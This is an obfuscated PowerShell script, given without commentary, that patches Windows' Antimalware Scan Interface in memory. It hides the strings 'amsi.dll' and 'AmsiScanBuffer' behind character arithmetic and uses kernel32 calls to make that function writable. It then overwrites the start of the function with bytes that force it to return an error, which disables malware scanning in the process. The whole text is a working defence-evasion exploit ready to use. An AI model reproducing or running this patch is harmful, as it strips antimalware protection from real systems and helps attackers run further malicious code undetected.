$XjjpdIKTAn3 = @"
using System;
using System.Runtime.InteropServices;
public class XjjpdIKTAn3 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr EtKyE7iWSYaqU, string VQF00y);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lc3p, UIntPtr lrwulo, uint CBtisbhot6Jup8, out uint FGPnGiyUefhdvMn8);
}
"@

Add-Type $XjjpdIKTAn3

$o3hjKPlBZngYYlcNfI = [XjjpdIKTAn3]::LoadLibrary("$(('ämsí'+'.dll').NOrMalIzE([ChAR](70*43/43)+[CHAR]([bytE]0x6f)+[Char](109+5)+[CHar]([BytE]0x6d)+[CHAr](68*59/59)) -replace [cHAr](92*3/3)+[chaR](112+11-11)+[char]([ByTe]0x7b)+[ChaR]([bYte]0x4d)+[CHAr](110+51-51)+[CHAr]([bYte]0x7d))")
$KxC = [XjjpdIKTAn3]::GetProcAddress($o3hjKPlBZngYYlcNfI, "$([Char]([byTE]0x41)+[chAr]([byTe]0x6d)+[chAr]([BYtE]0x73)+[CHAR]([ByTe]0x69)+[cHAr](83)+[Char](84+15)+[CHAR]([bytE]0x61)+[ChaR]([bytE]0x6e)+[cHaR]([BYtE]0x42)+[CHaR](117*60/60)+[cHaR]([Byte]0x66)+[cHar](20+82)+[ChAr]([byTE]0x65)+[char]([ByTe]0x72))")
$p = 0
[XjjpdIKTAn3]::VirtualProtect($KxC, [uint32]5, 0x40, [ref]$p)
$BPf4NJ5Dd7r5Q = "0xB8"
$J7SIrjBXl3btRjMYecW = "0x57"
$k49fGvcd8aadI0c3 = "0x00"
$mA5nmmQ2 = "0x07"
$kAcg5FaW3PJ7_AX0Yx = "0x80"
$ldgWe_DvMkoG_w = "0xC3"
$Y5Vbs2KYCJaX7W4EUcoA = [Byte[]] ($BPf4NJ5Dd7r5Q,$J7SIrjBXl3btRjMYecW,$k49fGvcd8aadI0c3,$mA5nmmQ2,+$kAcg5FaW3PJ7_AX0Yx,+$ldgWe_DvMkoG_w)
[System.Runtime.InteropServices.Marshal]::Copy($Y5Vbs2KYCJaX7W4EUcoA, 0, $KxC, 6)